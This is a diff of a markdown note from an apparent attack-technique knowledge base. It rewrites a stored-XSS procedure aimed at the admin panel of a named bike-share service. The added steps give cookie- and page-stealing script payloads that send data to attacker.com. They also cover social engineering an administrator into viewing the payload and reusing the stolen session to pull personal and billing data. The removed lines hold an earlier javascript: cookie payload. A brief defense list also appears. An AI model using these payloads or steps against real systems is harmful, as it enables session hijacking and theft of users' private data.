@@ -1,11 +1,10 @@
 ---
 tags:
-  - xss-execution
-  - admin-panel
-  - session-theft
+  - xss
+  - execution
+  - compromise
 type: procedure
-tools:
-  - '[[tools/Custom-JavaScript-Exploit-Script]]'
+tools: []
 tactics:
   - '[[Execution]]'
   - '[[Collection]]'
@@ -13,14 +12,16 @@ commands: []
 verified: false
 platforms:
   - Web
-  - Shopify
 submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:15:52.860Z'
+updated_at: '2025-12-14T17:30:26.761Z'
+skill_level: intermediate
+impact_level: high
+detection_risk: medium
 sub_techniques: []
-id: 78faf7ba-daf2-4732-8581-bb55096bffb0
+id: b722ba9f-f57d-42f9-87e4-4e7792efc175
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -32,49 +33,55 @@ mitre_techniques:
 
 ## Summary
 
-This procedure describes how an admin's interaction with the tainted order details triggers the persistent XSS payload, leading to JavaScript execution in their browser and potential shop takeover.
+This procedure leverages the stored XSS payload to execute arbitrary JavaScript when an administrator views the compromised user in the Jump bikes admin panel, resulting in session hijacking and data exposure.
 
 ## Description
 
-Once the malicious order is placed, the unsanitized referer appears as a hyperlink in the Shopify admin's order view (e.g., under 'How did they find us?'). Clicking it executes the javascript: URI in the admin's context, allowing cookie theft or session hijacking. The PoC uses a script to exfiltrate data. Prerequisites: Admin access to the panel; attacker waits for view. Outcomes: Arbitrary JS execution, full compromise.
+Once the payload is stored via the user name field, it is rendered without sanitization in the admin panel at manage.jumpbikes.com. When an admin loads the user management view, the JavaScript executes in their browser, potentially stealing session tokens, navigating to malicious sites, or exfiltrating sensitive data like user activity logs, personal details, and billing information. As a blind XSS, confirmation comes from external indicators like server callbacks. The target environment is the web-based admin interface; attacker needs no direct admin access but relies on admin interaction.
 
 ## Requirements
 
-1. Admin login to Shopify dashboard
-2. Access to the specific order with tainted referer
-3. No attacker intervention needed post-persistence
+1. Previously injected and stored XSS payload in a user name
+2. Attacker-controlled endpoint for exfiltration verification
+3. Knowledge of admin panel URL (manage.jumpbikes.com)
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Render referer as plain text, not clickable links
-- Implement output encoding for all admin-displayed user inputs
-- Use browser extensions or WAF to block javascript: URIs
+- Sanitize all outputs in admin views, especially user-generated content
+- Implement role-based access controls and audit admin panel renders
+- Deploy web application firewalls (WAF) to block XSS patterns and monitor for anomalous outbound requests from admin sessions
 
 ## Objectives
 
-1. Execute payload in privileged admin session
-2. Exfiltrate sensitive data like cookies
-3. Achieve account or shop takeover
+1. Execute payload in admin browser context
+2. Compromise admin session for privilege escalation
+3. Exfiltrate sensitive user data
 
 ## Instructions
 
-### Step 1: Access Admin Panel and View Order
+### Step 1: Induce Admin Interaction
 
-**Context**: Admin navigates to the vulnerable order.
+**Context**: Ensure the admin views the affected user to trigger rendering.
 
-**Instructions**: Log in to `https://admin.shopify.com/store/{store}` and go to Orders > select the malicious order.
+Socially engineer or wait for natural admin review (e.g., report the account or perform actions that prompt admin scrutiny). The payload activates upon admin loading the user list or profile in the panel.
 
-> The referer field shows as `<a href="javascript:alert(document.cookie)">javascript:alert(document.cookie)</a>`.
+### Step 2: Payload Execution
 
-### Step 2: Click the Tainted Link
+**Context**: The stored script runs automatically in the admin's DOM.
 
-**Context**: Trigger execution by interacting with the link.
+No direct action needed from attacker; upon render, the payload like `<script>fetch('https://attacker.com?data='+encodeURIComponent(document.body.innerHTML));</script>` executes, sending admin context data to the attacker.
 
-**Instructions**: Click the referer hyperlink; the browser executes the JS payload, e.g., alerting cookies or sending to attacker server via the custom script.
+> For impact, extend payload to keylog or redirect: `<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>`.
 
-> For PoC: Loads external script from `https://4cf3b563d73754fce54cf4936833f2ef021ec815.googledrive.com/.../1.js` to perform session theft.
+### Step 3: Confirm and Exploit
+
+**Context**: Validate execution and leverage the compromise.
+
+Monitor the attacker server for incoming requests containing admin data. Use stolen session to access the admin panel directly, querying user databases for activity, PII, and billing info.
+
+**Expected Output**: Server logs show exfiltrated data; attacker gains admin-equivalent access.
 
 ## MITRE ATT&CK Mapping
 
@@ -95,9 +102,9 @@ Defensive measures and detection strategies:
 
 ## Tools Used
 
-- [[tools/Custom-JavaScript-Exploit-Script]]
 
 ## Tags
 
-- [[xss-execution]]
-- [[session-theft]]
+- [[xss]]
+- [[Execution]]
+- [[data-exfiltration]]
